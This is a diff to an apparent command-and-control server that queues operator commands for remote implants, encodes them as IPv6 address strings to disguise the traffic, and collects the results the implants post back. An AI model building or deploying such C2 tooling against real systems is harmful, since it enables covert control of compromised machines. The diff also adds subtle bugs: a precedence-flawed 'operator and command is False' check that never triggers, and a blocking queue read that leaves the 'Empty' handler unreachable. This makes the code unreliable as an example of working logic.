@@ -56,7 +56,7 @@ def get_results(user_id):
     # Get the users dict
     fetched = str(result_storage.get(user_id, []))
     logger.info(f"got results {fetched}")
-    # result_storage[user_id] = []
+    result_storage.pop(user_id, 0)
     return fetched
 
 
@@ -64,15 +64,15 @@ def get_waiting_command(implant_id):
     queue = implant_command_queues.get(implant_id)
     if queue:
         try:
-            operator, command = queue.get_nowait()  # Use get_nowait to avoid blocking
+            operator, command = queue.get()
             logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
             return operator, command
         except Empty:
             logger.info(f"No commands available for {implant_id}")
-            return "", ""
+            return False, False
     else:
         logger.info(f"No queue found for {implant_id}")
-        return "", ""
+        return False, False
 
 
 def handle_update(uname, implant_id, result):
@@ -160,11 +160,14 @@ def catch_all_get(path):
     # Get the message FIFO
     try:
         operator, command = get_waiting_command(path)
+        if operator and command is False:
+            return "error"
         checkout_command(path, operator)
         command = ipv6_encoder.string_to_ipv6(command)
         return command
     except Exception as e:
-        return str(e)
+        logger.error(f"error: {e}")
+        return "error"
 
 
 @app.route('/<path:path>', methods=['POST'])
@@ -173,7 +176,9 @@ def catch_all_post(path):
         logger.info(f"{path} sending us data")
         # Get the data
         result = request.get_json()
+        # The result comes in as a JSON object under the field msg
         result = result.get("msg")
+        # Check which operator is waiting for a result
         queue = implant_checkout[path]
         logger.info("got queue for operator")
         operator = queue.get()
